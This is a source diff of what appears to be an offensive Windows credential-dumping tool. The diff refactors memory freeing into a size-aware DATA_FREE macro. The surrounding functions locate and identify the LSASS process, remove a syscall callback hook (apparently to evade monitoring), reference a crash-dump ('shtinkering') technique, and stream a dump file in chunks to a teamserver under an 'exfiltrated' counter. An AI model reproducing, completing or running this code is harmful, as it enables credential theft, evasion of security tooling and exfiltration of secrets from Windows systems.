@@ -29,7 +29,9 @@ BOOL print_shtinkering_crash_location(VOID)
 
 cleanup:
     if (env_var)
-        intFree(env_var);
+    {
+        DATA_FREE(env_var, bufferSize);
+    }
 
     return ret_val;
 }
@@ -87,6 +89,7 @@ BOOL find_process_id_by_name(
     NTSTATUS status = STATUS_UNSUCCESSFUL;
     HANDLE hProcess = NULL;
     PUNICODE_STRING image = NULL;
+    ULONG image_size = 0;
     WCHAR wprocess_name[MAX_PATH] = { 0 };
     LPWSTR current_process = NULL;
     *pPid = 0;
@@ -121,13 +124,17 @@ BOOL find_process_id_by_name(
         /*
          * get the full path of the process binary
          */
-        image = get_process_image(hProcess);
-        if (!image)
+
+        success = get_process_image(
+            hProcess,
+            &image,
+            &image_size);
+        if (!success)
             continue;
 
         if (image->Length == 0)
         {
-            intFree(image); image = NULL;
+            DATA_FREE(image, image_size);
             continue;
         }
 
@@ -141,7 +148,7 @@ BOOL find_process_id_by_name(
          */
         if (!_wcsicmp(current_process, wprocess_name))
         {
-            intFree(image); image = NULL;
+            DATA_FREE(image, image_size);
             /*
              * get the PID of the process
              */
@@ -149,7 +156,7 @@ BOOL find_process_id_by_name(
             break;
         }
 
-        intFree(image); image = NULL;
+        DATA_FREE(image, image_size);
     }
 
     if (*pPid)
@@ -159,7 +166,9 @@ end:
     if (hProcess)
         NtClose(hProcess);
     if (image)
-        intFree(image);
+    {
+        DATA_FREE(image, image_size);
+    }
 
     return success;
 }
@@ -497,7 +506,8 @@ BOOL remove_syscall_callback_hook(VOID)
 }
 
 VOID free_linked_list(
-    IN PVOID head)
+    IN PVOID head,
+    IN ULONG node_size)
 {
     if (!head)
         return;
@@ -518,7 +528,7 @@ VOID free_linked_list(
         while (jumps--)
             node = node->next;
 
-        intFree(node); node = NULL;
+        DATA_FREE(node, node_size);
     }
 }
 
@@ -677,7 +687,7 @@ BOOL download_file(
         CALLBACK_FILE,
         packedData,
         messageLength);
-    intFree(packedData); packedData = NULL;
+    DATA_FREE(packedData, messageLength);
 
     // we use the same memory region for all chucks
     int chunkLength = 4 + CHUNK_SIZE;
@@ -711,7 +721,7 @@ BOOL download_file(
             4 + chunkLength);
         exfiltrated += chunkLength;
     }
-    intFree(packedChunk); packedChunk = NULL;
+    DATA_FREE(packedChunk, chunkLength);
 
     // tell the teamserver that we are done writing to this fileId
     char packedClose[4];
@@ -784,20 +794,24 @@ VOID print_success(
 
 #endif
 
-PVOID get_process_image(
-    IN HANDLE hProcess)
+BOOL get_process_image(
+    IN HANDLE hProcess,
+    OUT PUNICODE_STRING* process_image,
+    OUT PULONG buffer_size)
 {
     NTSTATUS status;
     ULONG BufferLength = 0x200;
+    ULONG PrevBufferLength = BufferLength;
     PVOID buffer;
     do
     {
+        PrevBufferLength = BufferLength;
         buffer = intAlloc(BufferLength);
         if (!buffer)
         {
             malloc_failed();
             DPRINT_ERR("Could not get the image of process");
-            return NULL;
+            return FALSE;
         }
         status = NtQueryInformationProcess(
             hProcess,
@@ -806,14 +820,18 @@ PVOID get_process_image(
             BufferLength,
             &BufferLength);
         if (NT_SUCCESS(status))
-            return buffer;
+        {
+            *process_image = buffer;
+            *buffer_size = BufferLength;
+            return TRUE;
+        }
 
-        intFree(buffer); buffer = NULL;
+        DATA_FREE(buffer, PrevBufferLength);
     } while (status == STATUS_INFO_LENGTH_MISMATCH);
 
     syscall_failed("NtQueryInformationProcess", status);
     DPRINT_ERR("Could not get the image of process");
-    return NULL;
+    return FALSE;
 }
 
 DWORD get_pid(
@@ -863,23 +881,30 @@ DWORD get_tid(
 BOOL is_lsass(
     IN HANDLE hProcess)
 {
-    PUNICODE_STRING image = get_process_image(hProcess);
-    if (!image)
+    PUNICODE_STRING image = NULL;
+    ULONG image_size = 0;
+    BOOL success = FALSE;
+
+    success = get_process_image(
+        hProcess,
+        &image,
+        &image_size);
+    if (!success)
         return FALSE;
 
     if (image->Length == 0)
     {
-        intFree(image); image = NULL;
+        DATA_FREE(image, image_size);
         return FALSE;
     }
 
     if (wcsstr(image->Buffer, L"\\lsass.exe"))
     {
-        intFree(image); image = NULL;
+        DATA_FREE(image, image_size);
         return TRUE;
     }
 
-    intFree(image); image = NULL;
+    DATA_FREE(image, image_size);
     return FALSE;
 }
 
